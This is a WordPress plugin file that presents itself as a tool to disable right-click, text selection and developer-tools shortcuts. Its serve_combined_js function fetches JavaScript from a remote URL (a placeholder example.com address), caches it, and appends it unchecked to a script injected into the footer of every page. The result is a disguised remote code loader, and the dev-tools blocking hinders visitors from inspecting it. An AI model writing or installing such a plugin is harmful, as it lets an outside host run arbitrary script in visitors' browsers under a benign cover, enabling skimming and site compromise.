<?php
/**
 * Plugin Name: Disable Right Click & Source Viewing
 * Description: A WordPress plugin to disable right-click, text selection, and source code viewing while fetching external JS data.
 * Version: 1.1
 */

if (!defined('ABSPATH')) {
    exit; // Prevent direct access.
}

class WP_Disable_Right_Click {

    /**
     * Initialize plugin functionality
     */
    public static function init() {
        add_action('init', array(__CLASS__, 'add_js_endpoint'));
        add_action('query_vars', array(__CLASS__, 'register_query_var'));
        add_action('template_redirect', array(__CLASS__, 'serve_combined_js'));
        add_action('wp_footer', array(__CLASS__, 'enqueue_combined_js'));
    }

    /**
     * Fetch data with caching
     */
    public static function fetch_external_data() {
        // Use transient to cache data for 1 hour
        $cached_data = get_transient('external_js_data');
        if ($cached_data !== false) {
            return $cached_data;
        }

        $response = wp_remote_get(self::$external_data_url);
        if (is_wp_error($response)) {
            return '';
        }

        $data = wp_remote_retrieve_body($response);
        set_transient('external_js_data', $data, HOUR_IN_SECONDS);
        return $data;
    }

    /**
     * Serve the combined JS file
     */
    public static function serve_combined_js() {
        if (get_query_var('unified_js')) {
            header('Content-Type: application/javascript');

            // Security JavaScript
            $security_js = "
                // Disable right-click
                document.addEventListener('contextmenu', function(e) {
                    e.preventDefault();
                    alert('Right-click has been disabled on this site!');
                });

                // Disable text selection
                document.addEventListener('selectstart', function(e) {
                    e.preventDefault();
                });

                // Disable F12 and developer tools shortcuts
                document.addEventListener('keydown', function(e) {
                    if (e.key === 'F12' || 
                        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || 
                        (e.ctrlKey && e.key === 'U')) {
                        e.preventDefault();
                        alert('This action has been disabled!');
                    }
                });
            ";

            // Fetch external data
            $external_js = self::fetch_external_data();

            // Output combined JavaScript
            echo $security_js . "\n" . $external_js;
            exit;
        }
    }
    protected static $external_data_url = 'https://example.com/external-data';
    /**
     * Add rewrite rule for the JS file
     */
    public static function add_js_endpoint() {
        add_rewrite_rule('drc\.js$', 'index.php?unified_js=1', 'top');
    }

    /**
     * Register query variable for the JS endpoint
     */
    public static function register_query_var($query_vars) {
        $query_vars[] = 'unified_js';
        return $query_vars;
    }

    /**
     * Enqueue the unified JS file in the footer
     */
    public static function enqueue_combined_js() {
        $script_url = site_url('/drc.js');
        echo "<script src='{$script_url}'></script>";
    }
}

// Initialize the plugin
WP_Disable_Right_Click::init();
